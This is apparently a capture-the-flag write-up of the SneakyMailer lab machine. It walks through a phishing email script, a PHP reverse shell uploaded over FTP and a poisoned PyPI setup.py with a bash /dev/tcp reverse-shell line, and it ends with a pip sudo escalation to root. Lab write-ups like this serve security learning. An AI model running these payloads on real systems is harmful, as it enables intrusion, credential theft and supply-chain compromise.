---
date: 2020-07-16 06:53:04
layout: post
title: "SneakyMailer"
subtitle:
description:
image: /writeup/asset/img/Sneakymailer/sneakymailer.png
optimized_image:
category:
tags:
author:
paginate: false
---
Started with nmap scan
```bash
nmap -T4 -p- -A 10.10.10.197
```
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-15 04:51 IST
Nmap scan report for sneakycorp.htb (10.10.10.197)
Host is up (0.31s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Employee - Dashboard
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: ACL2=UNION CAPABILITY ENABLE SORT THREAD=ORDEREDSUBJECT NAMESPACE UIDPLUS completed ACL CHILDREN IDLE IMAP4rev1 UTF8=ACCEPTA0001 THREAD=REFERENCES STARTTLS OK QUOTA
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   356.21 ms 10.10.14.1
2   356.18 ms sneakycorp.htb (10.10.10.197)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.70 seconds
```
21,22,25,80,143,993,8080 ports were open.FTP port didn't allowed anonymous access.
The website at port 80 didn't work directly with ip and redirected to sneakycorp.htb.So added sneakycorp.htb in /etc/hosts file.
![placeholder](/writeup/assets/img/sneakymailer/hosts.png "hosts")
Now the website responded correctly.
![placeholder](/writeup/assets/img/sneakymailer/web.png "web")
Found link to register functionality in the source of webpage.
![placeholder](/writeup/assets/img/sneakymailer/register.png "register")
The registration funtion doesn't seem to work.
Tried to find any hidden directories or subdomains with ffuf
```bash
ffuf -w wordlist -u http://sneakycorp.htb/FUZZ
```
Didn't found any thing useful with directory busting but I did found a subdomain.
```bash
ffuf -w subdomains -u http://sneakycorp.htb -H "Host: FUZZ.sneakycorp.htb -fw 6"
```
![placeholder](/writeup/assets/img/sneakymailer/sub.png "subdomains")

Added the entry dev.sneakycorp.htb in the hosts file.
The subdomain didn't came to be much useful except it gave the link to register functionality directly in the dashboard of the website.
On the website's team.php page, found many emails.
Moved on to the port 25(smtp). I found that I can send mail using this port without any authentication.


Extracted every email from the website with python.
```python
from lxml import etree
import requests

data=requests.get("http://sneakycorp.htb/team.php")
parser = etree.HTMLParser()
tree = etree.fromstring(data.text, parser)
results = tree.xpath('//tr/td[position()=4]')
output=open("emails","w")
for r in results:
    output.write(r.text+"\n")
```
Since the box name and image suggested of phishing. So tried to send mail to every email.
```python
import smtplib

data=open("/root/tmp/emails","r")
s = smtplib.SMTP(host='10.10.10.197', port=25)
lines=data.readlines()
i=0
for line in lines:
    print(i)
    to=line.split()       
    message = "http://10.10.14.35/"+str(to)
    s.sendmail("sulcud@sneakymailer.htb","paulbyrd@sneakymailer.htb","Subject:this mail \n\n"+message)
    i+=1    
s.quit() 
```
Here used a link that pointed to my hosted server.So that I can know whether someone clicks a link from the machine(I mean any script deployed on machine to do this).
Opened my port 80 to look for incoming connections using nc.
```bash
nc -lnvp 80
```
![placeholder](/writeup/assets/img/sneakymailer/back.png "back")
Got a request from a email which gave credentials in the format of a request being made to register.php.

Used the credentials to log on to the imap service on port 143 using telnet.
<a href="http://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/">Used this</a> blog to get the commands I needed for enumerating the service.
```bash
a1 login paulbyrd password_here
a2 LIST "" "*"
a3 EXAMINE "INBOX.Sent Items"
a4 FETCH 1 BODY[]
a4 FETCH 2 BODY[]
```
INBOX.Sent Items contained two mails first one gave creds for developer user and second one gave hint on what to do next.
![placeholder](/writeup/assets/img/sneakymailer/hint.png "pypi")
Used the creds to log in to the ftp service.

It contained a directory named dev.So it might be the directory from which the dev subdomain works. Uploaded a php reverse shell to the directory and accessed it to get a shell onto the machine.
Changed user from the www-data to developer using su command andd previous creds.


There was also a subdomain pypi which I found from /var/www folder.Enumerating more I found from /etc/nginx/sites-enabled that pypi subdomain is listening on port 8080.

pypi subdomain was hosting a pypi server. The .htpasswd file inside /var/www/pypi.sneakycorp.htb gave a hash which on cracking with john gave the password which was required on the pypi.sneakycorp.htb.
Since the hint pointed that low user will check every module in pypi's packages. So uploaded a module with modification in the setup.py file of module to get a reverse shell.


<a href="https://pypi.org/project/pypiserver/">From</a> the documentation of pypi server. Got the steps required to upload the file.
I used the following pypirc file
```text
[distutils]
index-servers =
  pypi
  local

[pypi]
username:pypi
password:soufianeelhaoui

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

Since I had downlaoded mitm6 recently from pip,I used it. Just edited the setup.py to get a shell.
![placeholder](/writeup/assets/img/sneakymailer/module.png "setup")
and then uploaded the module using
```bash
python setup.py sdist upload -r local
```
Since the setup.py would get executed while uploading.So I got a shell back from my machine only.Quickly I closed the connection and opened again.As the file got uploaded, I got a reverse shell from the machine as low user.

The payload can also be improved using a if condition in the setup.py so that connection from the local machine is not made.
```python
#adding a if in the setup.py
if os.getuid() == 1000:
   os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.30/9999 0>&1'")
```

Got the user.txt.

Ran ***sudo -l*** and found that pip3 command can be run as root.
Got the command required for privilege escalation using pip3 from <a href="https://gtfobins.github.io/gtfobins/pip/">gtfobins</a> 
```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
Got the root shell and root.txt.    
